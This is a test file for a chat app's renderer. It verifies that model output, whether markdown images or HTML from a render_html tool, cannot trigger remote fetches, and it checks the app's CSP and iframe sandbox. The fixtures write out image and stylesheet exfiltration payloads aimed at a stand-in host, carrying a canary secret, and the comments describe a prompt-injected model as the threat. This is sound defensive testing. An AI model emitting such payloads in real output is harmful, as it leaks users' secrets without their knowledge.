/**
 * Egress the MODEL can open on its own.
 *
 * The app's premise is that nothing leaves the device unless the user connects
 * a remote provider and is told so per message. Model output is untrusted — a
 * prompt-injected model is the threat, not a careless user — and a rendered
 * markdown image is a GET the page makes on the user's behalf with no click.
 *
 * Measured before the fix: `![](https://evil.example/p.png?d=sk-live-CANARY)`
 * rendered as a live cross-origin `<img>`, AND React emitted a
 * `<link rel="preload" as="image">` for it, so the request fired even earlier.
 * Neither the web nor the mobile build shipped a CSP that would stop it.
 */

import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { renderToStaticMarkup } from 'react-dom/server';
import { createElement } from 'react';
import { describe, expect, it } from 'vitest';

import { Markdown } from '@/ui/Markdown';
import { MessageView } from '@/features/chat/MessageView';
import { FRAME_CONTENT_SECURITY_POLICY, frameDocument } from '@/ui/frame';

const CANARY = 'sk-live-EXFIL-CANARY';
const render = (text: string): string => renderToStaticMarkup(createElement(Markdown, { text }));

describe('a model cannot make the page fetch a remote URL', () => {
  it('drops a cross-origin image rather than rendering it', () => {
    const html = render(`![](https://evil.example/p.png?d=${CANARY})`);
    expect(html).not.toContain('evil.example');
    expect(html).not.toContain(CANARY);
  });

  it('drops the preload React would otherwise emit for it', () => {
    // The preload is the earlier of the two requests, so asserting only on
    // `<img>` would have left the faster channel open.
    const html = render(`![](https://evil.example/p.png?d=${CANARY})`);
    expect(html).not.toContain('rel="preload"');
  });

  it('drops a protocol-relative source, which is remote too', () => {
    expect(render(`![](//evil.example/p.png?d=${CANARY})`)).not.toContain('evil.example');
  });

  it('still renders the images the app itself produces', () => {
    // Studio writes data: URIs and attachments are blob:. Refusing these would
    // trade an exfiltration channel for a broken feature.
    expect(render('![](data:image/png;base64,iVBORw0KGgo=)')).toContain('data:image/png');
    expect(render('![](/icon.svg)')).toContain('/icon.svg');
  });

  it('refuses a javascript: link but keeps an ordinary one', () => {
    // A link is a click the user makes deliberately, which is a different act
    // from a fetch the page makes for them — so http(s) stays.
    expect(render('[x](javascript:alert(1))')).not.toContain('javascript:');
    expect(render('[x](https://example.com/)')).toContain('https://example.com/');
  });

  it('ships a CSP that refuses remote images even if a component forgets', () => {
    const html = readFileSync(resolve(process.cwd(), 'index.html'), 'utf8');
    const csp = /content-security-policy"?\s+content="([^"]+)"/i.exec(html)?.[1] ?? '';
    expect(csp).toMatch(/img-src/);
    expect(csp).not.toMatch(/img-src[^;]*\*/);
    expect(csp).not.toMatch(/img-src[^;]*https:(?!\/)/);
  });
});

/**
 * `render_html` is the other place model bytes become a rendered document, and
 * the model writes the whole fragment rather than one URL.
 *
 * The comment above the iframe claimed "No scripts, no same-origin, no
 * network". `sandbox=""` delivers the first two; it has never had anything to
 * say about subresource loading, so the third was false and an `<img>` in the
 * fragment was the same zero-click GET that markdown had.
 */
describe('a model cannot make its rendered HTML fetch a remote URL', () => {
  const message = {
    id: 'm1',
    chatId: 'c1',
    role: 'assistant' as const,
    content: '',
    createdAt: 0,
    toolCalls: [
      {
        id: 't1',
        name: 'render_html',
        input: {
          html: `<img src="https://evil.example/p.png?d=${CANARY}"><link rel="stylesheet" href="https://evil.example/s.css?d=${CANARY}">`,
        },
        output: 'ok',
      },
    ],
  };

  const frame = (): string =>
    renderToStaticMarkup(
      createElement(MessageView, {
        message,
        showThinking: false,
        onRegenerate: () => {},
        onEdit: () => {},
      }),
    );

  it('renders the fragment inside a document that refuses every remote fetch', () => {
    const html = frame();
    // The iframe is really there and really carries the model's markup —
    // otherwise the policy assertions below would be about nothing.
    expect(html).toMatch(/srcdoc=/i);
    expect(html).toContain('evil.example');

    const doc = /srcdoc="([^"]*)"/i.exec(html)?.[1] ?? '';
    expect(doc).toContain('Content-Security-Policy');
    expect(doc).toContain('default-src &#x27;none&#x27;');
    // Nothing that reaches the network is named. `data:` is the app's own
    // images; a scheme that leaves the device is not in the policy at all.
    expect(FRAME_CONTENT_SECURITY_POLICY).not.toMatch(/https?:/);
    expect(FRAME_CONTENT_SECURITY_POLICY).not.toMatch(/\*/);
  });

  it('puts the policy before the model’s bytes, where a meta CSP still counts', () => {
    // A `<meta>` policy governs what follows it. After the fragment it is
    // decoration, so the ordering is the mechanism and not house style.
    const doc = frameDocument('<img src="https://evil.example/p.png">');
    expect(doc.indexOf('Content-Security-Policy')).toBeLessThan(doc.indexOf('evil.example'));
  });

  it('keeps the sandbox attribute, which stops the things a CSP does not', () => {
    // The two are not substitutes: the CSP does not revoke same-origin or stop
    // top-level navigation, and the sandbox does not stop a fetch.
    expect(frame()).toContain('sandbox=""');
  });
});
